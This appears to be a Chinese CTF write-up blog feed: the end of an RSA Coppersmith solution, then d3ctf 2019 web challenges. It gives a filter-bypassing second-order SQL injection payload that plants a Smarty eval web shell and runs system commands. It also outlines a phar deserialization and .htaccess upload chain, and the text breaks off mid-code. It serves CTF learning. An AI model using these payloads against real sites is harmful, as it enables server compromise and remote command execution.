p方程的小根</p><p>已知<code>bytes_to_long(os.urandom(32)*8)</code>会是<code>bytes_to_long((&#39;\x00&#39;*31+&#39;\x01&#39;)*8)</code>的倍数，设<code>t = bytes_to_long((&#39;\x00&#39;*31+&#39;\x01&#39;)*8)</code></p><p>通过小根求出来的r和i=1452，得到p=(r*t+1452)，monic表示首一</p><pre class=" language-python"><code class="language-python">n<span class="token operator">=</span><span class="token number">120807710153113702551615579080626349972702435654213602643278178850601270671946229285821528380336690426317604059622034599839001416930715968066016772516322170847232613450387418879151680919583407733398280475244970196660246303755390654445483988806163997943960045202300170321033632884706732013873256539789027552900587666422370948750842536533923935656875965991272731558533581897633592458155859972323709278905289729445241014357315813048740496355157322217479024997808766708783034169626351658483634985294355975778256304622956911622334081421352132051371869608818591717661111189285407351900021893457439899221542567630909004930602528901255429064258255953091799356807896508016798627878778491866567622281528441807056062152648122769596905617532839645811871242955534491003544450002957748265702306031022676181061669831693628120952508570252446308607118097142440911574131249381253267168309302968966178203572103064042325655007707720847432033652545364390235670894288288369956445797446648862192044259720010703057599068467348014822871417162946598110099990800849922664801383108437169282005803013729663209291895365964487113632471631243676196750054390014101920098216264290734689252677221687512705895162185620154778448467145374612676883160397044672382343419867</span>t<span class="token operator">=</span>bytes_to_long<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'\x00'</span><span class="token operator">*</span><span class="token number">31</span><span class="token operator">+</span><span class="token string">'\x01'</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>K <span class="token operator">=</span> Zmod<span class="token punctuation">(</span>n<span class="token punctuation">)</span>P<span class="token punctuation">.</span><span class="token operator">&lt;</span>x<span class="token operator">></span> <span class="token operator">=</span> PolynomialRing<span class="token punctuation">(</span>K<span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1452</span><span class="token punctuation">,</span><span class="token number">1453</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    f<span class="token operator">=</span> x <span class="token operator">*</span> t <span class="token operator">+</span>i    r <span class="token operator">=</span>f<span class="token punctuation">.</span>monic<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>small_roots<span class="token punctuation">(</span>beta<span class="token operator">=</span><span class="token number">0.45</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> r<span class="token punctuation">:</span>        <span class="token keyword">print</span> i<span class="token punctuation">,</span>r        p <span class="token operator">=</span> r <span class="token operator">*</span> t <span class="token operator">+</span> i        <span class="token keyword">print</span> p</code></pre><p>sage运行得到</p><pre><code>1452 [25097212148084861298779072266686287643405205222520917844564707998487462593163]</code></pre><p>求出p,q，得到flag</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="http://inaz2.hatenablog.com/entries/2016/01/20" target="_blank" rel="noopener">http://inaz2.hatenablog.com/entries/2016/01/20</a></p><p><a href="https://www.jianshu.com/p/e407be39a22b" target="_blank" rel="noopener">https://www.jianshu.com/p/e407be39a22b</a><br><a href="https://github.com/mimoo/RSA-and-LLL-attacks" target="_blank" rel="noopener">https://github.com/mimoo/RSA-and-LLL-attacks</a><br><a href="https://code.felinae98.cn/ctf/crypto/rsa%E5%A4%A7%E7%A4%BC%E5%8C%85%EF%BC%88%E4%BA%8C%EF%BC%89coppersmith-%E7%9B%B8%E5%85%B3/" target="_blank" rel="noopener">https://code.felinae98.cn/ctf/crypto/rsa%E5%A4%A7%E7%A4%BC%E5%8C%85%EF%BC%88%E4%BA%8C%EF%BC%89coppersmith-%E7%9B%B8%E5%85%B3/</a></p><p><a href="https://xz.aliyun.com/t/6813" target="_blank" rel="noopener">https://xz.aliyun.com/t/6813</a></p>]]></content>
      
      
      <categories>
          
          <category> 密码学 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> rsa </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>d3ctf writeup</title>
      <link href="/2019/11/24/writeup/d3ctf-writeup/"/>
      <url>/2019/11/24/writeup/d3ctf-writeup/</url>
      
        <content type="html"><![CDATA[<h3 id="easyweb-二次注入"><a href="#easyweb-二次注入" class="headerlink" title="easyweb(二次注入)"></a>easyweb(二次注入)</h3><p>看一下控制器，就user.php和file.php</p><p>ci框架+smarty模版，猜测可能是模版注入</p><p>查找一下smarty的<code>display()</code>函数，在user.php的index里的display参数可控</p><pre class=" language-php"><code class="language-php"><span class="token comment" spellcheck="true">//user.php</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">session</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">has_userdata</span><span class="token punctuation">(</span><span class="token string">'userId'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$userView</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">Render_model</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">get_view</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">session</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">userId</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$prouserView</span> <span class="token operator">=</span> <span class="token string">'data:,'</span> <span class="token punctuation">.</span> <span class="token variable">$userView</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'username'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getUsername</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">session</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">userId</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">ci_smarty</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">assign</span><span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">ci_smarty</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">display</span><span class="token punctuation">(</span><span class="token variable">$prouserView</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'/user/login'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p><code>$userView</code>是来自<code>get_view()</code>函数，跟进一下，发现有拼接的sql语句，<code>username</code>参数可控，<code>username</code>会先经过<code>sql_safe()</code>,<code>safe_render()</code>两个过滤函数</p><pre class=" language-php"><code class="language-php"><span class="token comment" spellcheck="true">//Render_model.php</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">get_view</span><span class="token punctuation">(</span><span class="token variable">$userId</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">db</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string">"SELECT username FROM userTable WHERE userId='$userId'"</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">result</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token variable">$res</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span><span class="token punctuation">;</span>        <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">sql_safe</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">safe_render</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$userView</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">db</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string">"SELECT userView FROM userRender WHERE username='$username'"</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">result</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$userView</span> <span class="token operator">=</span> <span class="token variable">$userView</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">userView</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$userView</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p><code>sql_safe</code>先过滤select等关键字，<code>safe_render</code>过滤<code>{</code>,<code>}</code>，</p><pre class=" language-php"><code class="language-php"><span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function">safe_render</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'{'</span><span class="token punctuation">,</span><span class="token string">'}'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token variable">$username</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function">sql_safe</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/and|or|order|delete|select|union|load_file|updatexml|\(|extractvalue|\)/i'</span><span class="token punctuation">,</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token string">''</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token variable">$sql</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>我们可以构造payload绕过，limit只取第一条信息</p><pre class=" language-php"><code class="language-php">raohh' unio<span class="token punctuation">{</span>n selec<span class="token punctuation">}</span>t <span class="token number">0x7B7B7068707D7D6576616C28245F504F53545B615D293B7B7B2F7068707D7D</span> limit <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token shell-comment comment">#</span></code></pre><p><code>$userView</code>会赋值为<code>{{php}}eval($_POST[&#39;a&#39;]);{{/php}}</code>被模版解析</p><p>最后读取flag</p><pre class=" language-php"><code class="language-php">a<span class="token operator">=</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">'/readflag /flag'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h3 id="ezupload-phar反序列化"><a href="#ezupload-phar反序列化" class="headerlink" title="ezupload(phar反序列化)"></a>ezupload(phar反序列化)</h3><p>web根目录在/var/www/html/xxx下，每十分钟变一次</p><p>题目</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">dir</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$userdir</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$url</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">,</span><span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">userdir</span> <span class="token operator">=</span> <span class="token string">"upload/"</span> <span class="token punctuation">.</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">"HTTP_X_REAL_IP"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">url</span> <span class="token operator">=</span> <span class="token variable">$url</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span>  <span class="token operator">=</span>  <span class="token variable">$filename</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">userdir</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">userdir</span><span class="token punctuation">,</span> <span class="token number">0777</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">checkdir</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">userdir</span> <span class="token operator">!=</span> <span class="token string">"upload/"</span> <span class="token punctuation">.</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">"HTTP_X_REAL_IP"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'hacker!!!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">checkurl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$r</span> <span class="token operator">=</span> <span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$r</span><span class="token punctuation">[</span><span class="token string">'scheme'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/file|php/i"</span><span class="token punctuation">,</span><span class="token variable">$r</span><span class="token punctuation">[</span><span class="token string">'scheme'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'hacker!!!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">checkext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">stristr</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">,</span><span class="token string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'hacker!!!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">stristr</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">,</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'hacker!!!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token variable">$ext</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">,</span> <span class="token function">strrpos</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">,</span> <span class="token string">"."</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/ph/i"</span><span class="token punctuation">,</span> <span class="token variable">$ext</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'hacker!!!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">upload</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">checkdir</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">checkurl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">checkext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">url</span><span class="token punctuation">,</span><span class="token keyword">NULL</span><span class="token punctuation">,</span><span class="token keyword">NULL</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2048</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/\&lt;\?|value|on|type|flag|auto|set|\\\\/i"</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'hacker!!!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">userdir</span><span class="token punctuation">.</span><span class="token string">"/"</span><span class="token punctuation">.</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">,</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">remove</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">checkdir</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">checkext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">userdir</span><span class="token punctuation">.</span><span class="token string">"/"</span><span class="token punctuation">.</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">userdir</span><span class="token punctuation">.</span><span class="token string">"/"</span><span class="token punctuation">.</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$dir</span> <span class="token operator">===</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token variable">$num</span> <span class="token operator">=</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token function">scandir</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">userdir</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token variable">$num</span> <span class="token operator">=</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token function">scandir</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$num</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token string">"you have $num files"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">else</span><span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token string">"you don't have file"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token function">implode</span><span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">,</span><span class="token function">scandir</span><span class="token punctuation">(</span><span class="token constant">__DIR__</span><span class="token punctuation">.</span><span class="token string">"/"</span><span class="token punctuation">.</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">userdir</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$string</span> <span class="token operator">=</span> <span class="token string">"your file in : "</span><span class="token punctuation">.</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">userdir</span><span class="token punctuation">;</span>        <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">.</span><span class="token string">".txt"</span><span class="token punctuation">,</span> <span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token variable">$string</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'action'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$dir</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">dir</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'action'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string">"upload"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token variable">$dir</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">upload</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'action'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string">"remove"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token variable">$dir</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">remove</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'action'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string">"count"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'dir'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token variable">$dir</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">count</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token variable">$dir</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'dir'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>dir对象有三个方法 <code>upload</code> ,<code>remove</code>,<code>count</code>但是其中count()没用调用check，可以上传txt文件</p><p>phar文件可以通过gzip压缩绕过内容的检测</p><p>析构函数可以触发tostring读取web根目录</p><p>上传.htaccess执行命令</p><h4 id="读web根目录路径"><a href="#读web根目录路径" class="headerlink" title="读web根目录路径"></a>读web根目录路径</h4><p>构造phar</p><p>记一下踩坑：</p><p>unix环境下phar头部去掉<code>&lt;?</code>无法反序列化</p><p>触发Phar://反序列化必需要有后缀名</p><p>反序列化的destruct函数工作目录不在当前工作目录</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">dir</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$userdir</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$url</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$filename</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$phar</span> <span class="token operator">=</span> <span 